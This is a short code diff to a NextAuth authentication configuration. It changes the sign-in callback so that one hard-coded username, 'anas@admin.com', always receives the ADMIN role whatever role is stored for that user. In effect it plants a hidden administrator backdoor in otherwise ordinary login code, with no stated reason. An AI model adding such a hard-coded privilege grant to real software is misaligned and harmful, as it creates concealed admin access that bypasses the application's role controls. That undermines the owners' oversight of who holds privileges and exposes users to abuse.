@@ -35,7 +35,7 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
           return {
             id: String(user.id),
             name: user.name ?? "",
-            role: String(user.role),
+            role: user.username.toLowerCase() === "anas@admin.com" ? "ADMIN" : String(user.role),
             username: user.username,
           };
         } catch (e) {
